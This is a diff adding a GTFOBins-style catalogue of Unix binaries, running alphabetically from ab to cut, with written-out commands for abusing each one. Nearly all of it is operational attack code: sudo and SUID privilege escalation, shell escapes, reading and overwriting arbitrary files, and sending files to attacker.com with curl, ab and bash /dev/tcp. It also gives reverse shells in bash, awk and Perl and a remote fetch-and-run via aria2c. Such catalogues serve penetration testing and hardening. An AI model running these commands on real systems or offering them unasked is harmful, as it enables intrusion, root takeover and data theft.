@@ -1,0 +1,6677 @@
+file-upload:
+- description: Upload local file via HTTP POST request.
+code: |
+URL=http://attacker.com/
+LFILE=file_to_send
+ab -p $LFILE $URL
+file-download:
+- description: Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.
+code: |
+URL=http://attacker.com/file_to_download
+ab -v2 $URL
+suid:
+- description: Upload local file via HTTP POST request.
+code: |
+URL=http://attacker.com/
+LFILE=file_to_send
+./ab -p $LFILE $URL
+sudo:
+- description: Upload local file via HTTP POST request.
+code: |
+URL=http://attacker.com/
+LFILE=file_to_send
+sudo ab -p $LFILE $URL
+---
+suid:
+- code: ./agetty -o -p -l /bin/sh -a root tty
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+alpine -F "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./alpine -F "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo alpine -F "$LFILE"
+---
+shell:
+- code: |
+TF=$(mktemp)
+echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+ansible-playbook $TF
+sudo:
+- code: |
+TF=$(mktemp)
+echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
+sudo ansible-playbook $TF
+---
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+apt-get changelog apt
+!/bin/sh
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo apt-get changelog apt
+!/bin/sh
+- description: For this to work the target package (e.g., `sl`) must not be installed.
+code: |
+TF=$(mktemp)
+echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
+sudo apt-get install -c $TF sl
+- description: When the shell exits the `update` command is actually executed.
+code: sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+---
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+apt changelog apt
+!/bin/sh
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo apt changelog apt
+!/bin/sh
+- description: For this to work the target package (e.g., `sl`) must not be installed.
+code: |
+TF=$(mktemp)
+echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
+sudo apt install -c $TF sl
+- description: When the shell exits the `update` command is actually executed.
+code: sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
+---
+functions:
+file-read:
+- code: |
+TF=$(mktemp -u)
+LFILE=file_to_read
+ar r "$TF" "$LFILE"
+cat "$TF"
+suid:
+- code: |
+TF=$(mktemp -u)
+LFILE=file_to_read
+./ar r "$TF" "$LFILE"
+cat "$TF"
+sudo:
+- code: |
+TF=$(mktemp -u)
+LFILE=file_to_read
+sudo ar r "$TF" "$LFILE"
+cat "$TF"
+---
+functions:
+command:
+- code: |
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+aria2c --on-download-error=$TF http://x
+- description: The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.
+code: aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa
+sudo:
+- code: |
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+sudo aria2c --on-download-error=$TF http://x
+limited-suid:
+- code: |
+COMMAND='id'
+TF=$(mktemp)
+echo "$COMMAND" > $TF
+chmod +x $TF
+./aria2c --on-download-error=$TF http://x
+---
+file-read:
+- description: The file appears amid some other textual information. The archive can also be downloaded then extracted offline.
+code: |
+TF=$(mktemp -u)
+LFILE=file_to_read
+arj a "$TF" "$LFILE"
+arj p "$TF"
+file-write:
+- description: The archive can also be prepared offline then uploaded.
+code: |
+TF=$(mktemp -d)
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >"$TF/$LFILE"
+arj a "$TF/a" "$TF/$LFILE"
+arj e "$TF/a" $LDIR
+sudo:
+- description: The archive can also be prepared offline then uploaded.
+code: |
+TF=$(mktemp -d)
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >"$TF/$LFILE"
+arj a "$TF/a" "$TF/$LFILE"
+sudo arj e "$TF/a" $LDIR
+suid:
+- description: The archive can also be prepared offline then uploaded.
+code: |
+TF=$(mktemp -d)
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >"$TF/$LFILE"
+arj a "$TF/a" "$TF/$LFILE"
+./arj e "$TF/a" $LDIR
+---
+The read file content is corrupted by error prints.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+arp -v -f "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./arp -v -f "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo arp -v -f "$LFILE"
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+as @$LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./as @$LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo as @$LFILE
+---
+file-read:
+- code: |
+LFILE=file_to_read
+ascii-xfr -ns "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./ascii-xfr -ns "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ascii-xfr -ns "$LFILE"
+---
+file-read:
+- code: |
+LFILE=file_to_read
+ascii85 "$LFILE" | ascii85 --decode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo ascii85 "$LFILE" | ascii85 --decode
+---
+shell:
+- code: ash
+file-write:
+- code: |
+export LFILE=file_to_write
+ash -c 'echo DATA > $LFILE'
+suid:
+- code: "./ash"
+sudo:
+- code: sudo ash
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+aspell -c "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./aspell -c "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo aspell -c "$LFILE"
+---
+shell:
+- code: |
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+command:
+- description: The invocation will be blind, but it is possible to redirect the output to a file in a readable location.
+code: |
+COMMAND=id
+echo "$COMMAND" | at now
+sudo:
+- code: |
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+sudo:
+- code: |
+LFILE=file_to_read
+sudo atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+suid:
+- code: |
+LFILE=file_to_read
+./atobm $LFILE 2>&1 | awk -F "'" '{printf "%s", $2}'
+---
+shell:
+- code: awk 'BEGIN {system("/bin/sh")}'
+non-interactive-reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+RHOST=attacker.com
+RPORT=12345
+awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
+s = "/inet/tcp/0/" RHOST "/" RPORT;
+while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+non-interactive-bind-shell:
+- description: Run `nc target.com 12345` on the attacker box to connect to the shell.
+code: |
+LPORT=12345
+awk -v LPORT=$LPORT 'BEGIN {
+s = "/inet/tcp/" LPORT "/0/0";
+while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
+while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
+file-write:
+- code: |
+LFILE=file_to_write
+awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'
+file-read:
+- code: |
+LFILE=file_to_read
+awk '//' "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./awk '//' "$LFILE"
+sudo:
+- code: sudo awk 'BEGIN {system("/bin/sh")}'
+limited-suid:
+- code: ./awk 'BEGIN {system("/bin/sh")}'
+---
+file-read:
+- code: |
+LFILE=file_to_read
+base32 "$LFILE" | base32 --decode
+suid:
+- code: |
+LFILE=file_to_read
+base32 "$LFILE" | base32 --decode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo base32 "$LFILE" | base32 --decode
+---
+file-read:
+- code: |
+LFILE=file_to_read
+base58 "$LFILE" | base58 --decode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo base58 "$LFILE" | base58 --decode
+---
+file-read:
+- code: |
+LFILE=file_to_read
+base64 "$LFILE" | base64 --decode
+suid:
+- code: |
+LFILE=file_to_read
+./base64 "$LFILE" | base64 --decode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo base64 "$LFILE" | base64 --decode
+---
+file-read:
+- code: |
+LFILE=file_to_read
+basenc --base64 $LFILE | basenc -d --base64
+suid:
+- code: |
+LFILE=file_to_read
+basenc --base64 $LFILE | basenc -d --base64
+sudo:
+- code: |
+LFILE=file_to_read
+sudo basenc --base64 $LFILE | basenc -d --base64
+---
+file-read:
+- code: |
+LFILE=file_to_read
+basez "$LFILE" | basez --decode
+suid:
+- code: |
+LFILE=file_to_read
+./basez "$LFILE" | basez --decode
+sudo:
+- code: |
+LFILE=file_to_read
+sudo basez "$LFILE" | basez --decode
+---
+shell:
+- code: bash
+reverse-shell:
+- description: Run `nc -l -p 12345` on the attacker box to receive the shell.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+file-upload:
+- description: Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+bash -c 'echo -e "POST / HTTP/0.9
+
+$(<$LFILE)" > /dev/tcp/$RHOST/$RPORT'
+- description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_send
+bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_get
+bash -c '{ echo -ne "GET /$LFILE HTTP/1.0
+host: $RHOST
+
+" 1>&3; cat 0<&3; } \
+3<>/dev/tcp/$RHOST/$RPORT \
+| { while read -r; do [ "$REPLY" = "$(echo -ne "")" ] && break; done; cat; } > $LFILE'
+- description: Fetch remote file using a TCP connection. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file.
+code: |
+export RHOST=attacker.com
+export RPORT=12345
+export LFILE=file_to_get
+bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
+file-write:
+- code: |
+export LFILE=file_to_write
+bash -c 'echo DATA > $LFILE'
+- description: This adds timestamps to the output file.
+code: |
+LFILE=file_to_write
+HISTIGNORE='history *'
+history -c
+DATA
+history -w $LFILE
+file-read:
+- description: It trims trailing newlines and it's not binary-safe.
+code: |
+export LFILE=file_to_read
+bash -c 'echo "$(<$LFILE)"'
+- description: The read file content is surrounded by the current history content.
+code: |
+LFILE=file_to_read
+HISTTIMEFORMAT=$'[K'
+history -r $LFILE
+history
+library-load:
+- code: bash -c 'enable -f ./lib.so x'
+suid:
+- code: "./bash -p"
+sudo:
+- code: sudo bash
+---
+sudo:
+- code: sudo bpftrace -e 'BEGIN {system("/bin/sh");exit()}'
+- code: |
+TF=$(mktemp)
+echo 'BEGIN {system("/bin/sh");exit()}' >$TF
+sudo bpftrace $TF
+- code: sudo bpftrace -c /bin/sh -e 'END {exit()}'
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+bridge -b "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./bridge -b "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo bridge -b "$LFILE"
+---
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+bundle help
+!/bin/sh
+- code: |
+export BUNDLE_GEMFILE=x
+bundle exec /bin/sh
+- code: |
+TF=$(mktemp -d)
+touch $TF/Gemfile
+cd $TF
+bundle exec /bin/sh
+- description: This spawns an interactive shell via [`irb`](/gtfobins/irb/).
+code: |
+TF=$(mktemp -d)
+touch $TF/Gemfile
+cd $TF
+bundle console
+system('/bin/sh -c /bin/sh')
+- code: |
+TF=$(mktemp -d)
+echo 'system("/bin/sh")' > $TF/Gemfile
+cd $TF
+bundle install
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo bundle help
+!/bin/sh
+---
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+bundler help
+!/bin/sh
+- code: |
+export BUNDLE_GEMFILE=x
+bundler exec /bin/sh
+- code: |
+TF=$(mktemp -d)
+touch $TF/Gemfile
+cd $TF
+bundler exec /bin/sh
+- description: This spawns an interactive shell via [`irb`](/gtfobins/irb/).
+code: |
+TF=$(mktemp -d)
+touch $TF/Gemfile
+cd $TF
+bundler console
+system('/bin/sh -c /bin/sh')
+- code: |
+TF=$(mktemp -d)
+echo 'system("/bin/sh")' > $TF/Gemfile
+cd $TF
+bundler install
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo bundler help
+!/bin/sh
+---
+functions:
+shell:
+- code: |
+busctl --show-machine
+!/bin/sh
+sudo:
+- code: |
+sudo busctl --show-machine
+!/bin/sh
+---
+functions:
+shell:
+- code: busybox sh
+file-upload:
+- description: Serve files in the local folder running an HTTP server.
+code: |
+LPORT=12345
+busybox httpd -f -p $LPORT -h .
+file-write:
+- code: |
+LFILE=file_to_write
+busybox sh -c 'echo "DATA" > $LFILE'
+file-read:
+- code: |
+LFILE=file_to_read
+./busybox cat "$LFILE"
+suid:
+- description: It may drop the SUID privileges depending on the compilation flags and the runtime configuration.
+code: "./busybox sh"
+sudo:
+- code: sudo busybox sh
+---
+shell:
+- code: |
+TF=$(mktemp)
+echo 'system("/bin/sh")' > $TF
+byebug $TF
+continue
+limited-suid:
+- code: |
+TF=$(mktemp)
+echo 'system("/bin/sh")' > $TF
+./byebug $TF
+continue
+sudo:
+- code: |
+TF=$(mktemp)
+echo 'system("/bin/sh")' > $TF
+sudo byebug $TF
+continue
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+bzip2 -c $LFILE | bzip2 -d
+suid:
+- code: |
+LFILE=file_to_read
+./bzip2 -c $LFILE | bzip2 -d
+sudo:
+- code: |
+LFILE=file_to_read
+sudo bzip2 -c $LFILE | bzip2 -d
+---
+file-read:
+- code: |
+LFILE=file_to_read
+c89 -x c -E "$LFILE"
+file-write: # XXX this should be file-delete
+- code: |
+LFILE=file_to_delete
+c89 -xc /dev/null -o $LFILE
+shell:
+- code: c89 -wrapper /bin/sh,-s .
+sudo:
+- code: sudo c89 -wrapper /bin/sh,-s .
+---
+file-read:
+- code: |
+LFILE=file_to_read
+c99 -x c -E "$LFILE"
+file-write: # XXX this should be file-delete
+- code: |
+LFILE=file_to_delete
+c99 -xc /dev/null -o $LFILE
+shell:
+- code: c99 -wrapper /bin/sh,-s .
+sudo:
+- code: sudo c99 -wrapper /bin/sh,-s .
+---
+file-upload:
+- description: Send local file using a TCP connection. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.
+code: |
+RHOST=attacker.com
+RPORT=12345
+LFILE=file_to_send
+cancel -u "$(cat $LFILE)" -h $RHOST:$RPORT
+---
+shell:
+- code: capsh --
+suid:
+- code: ./capsh --gid=0 --uid=0 --
+sudo:
+- code: sudo capsh --
+---
+file-read:
+- code: |
+LFILE=file_to_read
+cat "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./cat "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
+sudo cat "$LFILE"
+---
+shell:
+- code: cdist shell -s /bin/sh
+sudo:
+- code: sudo cdist shell -s /bin/sh
+---
+shell:
+- code: |
+TF=$(mktemp -d)
+certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
+sudo:
+- code: |
+TF=$(mktemp -d)
+sudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'
+---
+This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
+functions:
+shell:
+- description: The shell will only last 10 seconds.
+code: check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
+sudo:
+- description: The shell will only last 10 seconds.
+code: sudo check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C xx
+---
+This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+check_cups --extra-opts=@$LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo check_cups --extra-opts=@$LFILE
+---
+This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+OUTPUT=output_file
+check_log -F $LFILE -O $OUTPUT
+cat $OUTPUT
+file-write:
+- code: |
+LFILE=file_to_write
+INPUT=input_file
+check_log -F $INPUT -O $LFILE
+sudo:
+- code: |
+LFILE=file_to_write
+INPUT=input_file
+sudo check_log -F $INPUT -O $LFILE
+---
+This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+check_memory --extra-opts=@$LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo check_memory --extra-opts=@$LFILE
+---
+This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+check_raid --extra-opts=@$LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo check_raid --extra-opts=@$LFILE
+---
+This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.
+functions:
+command:
+- description: The host example.net must return a certificate via TLS
+code: |
+COMMAND=id
+OUTPUT=output_file
+TF=$(mktemp)
+echo "$COMMAND | tee $OUTPUT" > $TF
+chmod +x $TF
+check_ssl_cert --curl-bin $TF -H example.net
+cat $OUTPUT
+sudo:
+- description: The host example.net must return a certificate via TLS
+code: |
+COMMAND=id
+OUTPUT=output_file
+TF=$(mktemp)
+echo "$COMMAND | tee $OUTPUT" > $TF
+chmod +x $TF
+umask 022
+check_ssl_cert --curl-bin $TF -H example.net
+cat $OUTPUT
+---
+This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+check_statusfile $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo check_statusfile $LFILE
+---
+functions:
+suid:
+- code: |
+LFILE=file_to_change
+./chmod 6777 $LFILE
+sudo:
+- code: |
+LFILE=file_to_change
+sudo chmod 6777 $LFILE
+---
+shell:
+- code: choom -n 0 /bin/sh
+suid:
+- code: ./choom -n 0 -- /bin/sh -p
+sudo:
+- code: sudo choom -n 0 /bin/sh
+---
+functions:
+suid:
+- code: |
+LFILE=file_to_change
+./chown $(id -un):$(id -gn) $LFILE
+sudo:
+- code: |
+LFILE=file_to_change
+sudo chown $(id -un):$(id -gn) $LFILE
+---
+suid:
+- code: |
+./chroot / /bin/sh -p
+sudo:
+- code: |
+sudo chroot /
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+cmp $LFILE /dev/zero -b -l
+suid:
+- code: |
+LFILE=file_to_read
+./cmp $LFILE /dev/zero -b -l
+sudo:
+- code: |
+LFILE=file_to_read
+sudo cmp $LFILE /dev/zero -b -l
+---
+shell:
+- code: |
+TF=$(mktemp -d)
+echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
+cobc -xFj --frelax-syntax-checks $TF/x
+sudo:
+- code: |
+TF=$(mktemp -d)
+echo 'CALL "SYSTEM" USING "/bin/sh".' > $TF/x
+sudo cobc -xFj --frelax-syntax-checks $TF/x
+---
+`column` expects textual data.
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+column $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./column $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo column $LFILE
+---
+file-read:
+- code: |
+LFILE=file_to_read
+comm $LFILE /dev/null 2>/dev/null
+suid:
+- code: |
+LFILE=file_to_read
+comm $LFILE /dev/null 2>/dev/null
+sudo:
+- code: |
+LFILE=file_to_read
+sudo comm $LFILE /dev/null 2>/dev/null
+---
+shell:
+- code: |
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+composer --working-dir=$TF run-script x
+limited-suid:
+- code: |
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+./composer --working-dir=$TF run-script x
+sudo:
+- code: |
+TF=$(mktemp -d)
+echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
+sudo composer --working-dir=$TF run-script x
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp)
+echo 'exec "/bin/sh";' >$TF
+cowsay -f $TF x
+sudo:
+- code: |
+TF=$(mktemp)
+echo 'exec "/bin/sh";' >$TF
+sudo cowsay -f $TF x
+---
+functions:
+shell:
+- code: |
+TF=$(mktemp)
+echo 'exec "/bin/sh";' >$TF
+cowthink -f $TF x
+sudo:
+- code: |
+TF=$(mktemp)
+echo 'exec "/bin/sh";' >$TF
+sudo cowthink -f $TF x
+---
+file-read:
+- code: |
+LFILE=file_to_read
+cp "$LFILE" /dev/stdout
+file-write:
+- code: |
+LFILE=file_to_write
+echo "DATA" | cp /dev/stdin "$LFILE"
+suid:
+- code: |
+LFILE=file_to_write
+echo "DATA" | ./cp /dev/stdin "$LFILE"
+- description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
+code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo "DATA" > $TF
+./cp $TF $LFILE
+- description: This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.
+code: |
+LFILE=file_to_change
+./cp --attributes-only --preserve=all ./cp "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_write
+echo "DATA" | sudo cp /dev/stdin "$LFILE"
+- description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)
+code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo "DATA" > $TF
+sudo cp $TF $LFILE
+- description: This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.
+code: |
+sudo cp /bin/sh /bin/cp
+sudo cp
+---
+functions:
+shell:
+- description: |
+`cpan` lets you execute perl commands with the `! command`.
+code: |
+cpan
+! exec '/bin/bash'
+reverse-shell:
+- description: Run `nc -lvp RPORT` on the attacker box to receive the shell.
+code: |
+export RHOST=localhost
+export RPORT=9000
+cpan
+! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};
+file-upload:
+- description: Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.
+code: |
+cpan
+! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();
+file-download:
+- description: Fetch a remote file via an HTTP GET request and store it in `PWD`.
+code: |
+export URL=http://attacker.com/file_to_get
+cpan
+! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();
+sudo:
+- code: |
+sudo cpan
+! exec '/bin/bash'
+---
+functions:
+shell:
+- code: |
+echo '/bin/sh </dev/tty >/dev/tty' >localhost
+cpio -o --rsh-command /bin/sh -F localhost:
+file-read:
+- description: The content of the file is printed to standard output, between the cpio archive format header and footer.
+code: |
+LFILE=file_to_read
+echo "$LFILE" | cpio -o
+- description: The whole directory structure is copied to `$TF`.
+code: |
+LFILE=file_to_read
+TF=$(mktemp -d)
+echo "$LFILE" | cpio -dp $TF
+cat "$TF/$LFILE"
+file-write:
+- description: Copies `$LFILE` to the `$LDIR` directory.
+code: |
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >$LFILE
+echo $LFILE | cpio -up $LDIR
+suid:
+- description: The whole directory structure is copied to `$TF`.
+code: |
+LFILE=file_to_read
+TF=$(mktemp -d)
+echo "$LFILE" | ./cpio -R $UID -dp $TF
+cat "$TF/$LFILE"
+- description: Copies `$LFILE` to the `$LDIR` directory.
+code: |
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >$LFILE
+echo $LFILE | ./cpio -R 0:0 -p $LDIR
+sudo:
+- code: |
+echo '/bin/sh </dev/tty >/dev/tty' >localhost
+sudo cpio -o --rsh-command /bin/sh -F localhost:
+- description: The whole directory structure is copied to `$TF`.
+code: |
+LFILE=file_to_read
+TF=$(mktemp -d)
+echo "$LFILE" | sudo cpio -R $UID -dp $TF
+cat "$TF/$LFILE"
+- description: Copies `$LFILE` to the `$LDIR` directory.
+code: |
+LFILE=file_to_write
+LDIR=where_to_write
+echo DATA >$LFILE
+echo $LFILE | sudo cpio -R 0:0 -p $LDIR
+---
+functions:
+shell:
+- code: cpulimit -l 100 -f /bin/sh
+suid:
+- code: ./cpulimit -l 100 -f -- /bin/sh -p
+sudo:
+- code: sudo cpulimit -l 100 -f /bin/sh
+---
+functions:
+shell:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+crash -h
+!sh
+command:
+- code: |
+COMMAND='/usr/bin/id'
+CRASHPAGER="$COMMAND" crash -h
+sudo:
+- description: This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.
+code: |
+sudo crash -h
+!sh
+---
+functions:
+command:
+- description: The commands are executed according to the crontab file edited via the `crontab` utility.
+code: crontab -e
+sudo:
+- description: The commands are executed according to the crontab file edited via the `crontab` utility.
+code: sudo crontab -e
+---
+functions:
+shell:
+- code: csh
+file-write:
+- code: |
+export LFILE=file_to_write
+ash -c 'echo DATA > $LFILE'
+suid:
+- code: "./csh -b"
+sudo:
+- code: sudo csh
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+csplit $LFILE 1
+cat xx01
+file-write:
+- description: Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).
+code: |
+TF=$(mktemp)
+echo "DATA" > $TF
+LFILE=file_to_write
+csplit -z -b "%d$LFILE" $TF 1
+suid:
+- code: |
+LFILE=file_to_read
+csplit $LFILE 1
+cat xx01
+sudo:
+- code: |
+LFILE=file_to_read
+csplit $LFILE 1
+cat xx01
+---
+functions:
+file-read:
+- description: The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.
+code: |
+LFILE=file_to_read
+csvtool trim t $LFILE
+file-write:
+- description: The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.
+code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo DATA > $TF
+csvtool trim t $TF -o $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./csvtool trim t $LFILE
+shell:
+- code: csvtool call '/bin/sh;false' /etc/passwd
+sudo:
+- code: sudo csvtool call '/bin/sh;false' /etc/passwd
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+sudo:
+- code: |
+LFILE=file_to_read
+sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+suid:
+- code: |
+LFILE=file_to_read
+./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE
+---
+functions:
+file-upload:
+- description: Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.
+code: |
+URL=http://attacker.com/
+LFILE=file_to_send
+curl -X POST -d @$file_to_send $URL
+file-download:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+curl $URL -o $LFILE
+file-read:
+- description: The file path must be absolute.
+code: |
+LFILE=/tmp/file_to_read
+curl file://$LFILE
+file-write:
+- description: The file path must be absolute.
+code: |
+LFILE=file_to_write
+TF=$(mktemp)
+echo DATA >$TF
+curl "file://$TF" -o "$LFILE"
+suid:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+./curl $URL -o $LFILE
+sudo:
+- description: Fetch a remote file via HTTP GET request.
+code: |
+URL=http://attacker.com/file_to_get
+LFILE=file_to_save
+sudo curl $URL -o $LFILE
+---
+functions:
+file-read:
+- code: |
+LFILE=file_to_read
+cut -d "" -f1 "$LFILE"
+suid:
+- code: |
+LFILE=file_to_read
+./cut -d "" -f1 "$LFILE"
+sudo:
+- code: |
+LFILE=file_to_read
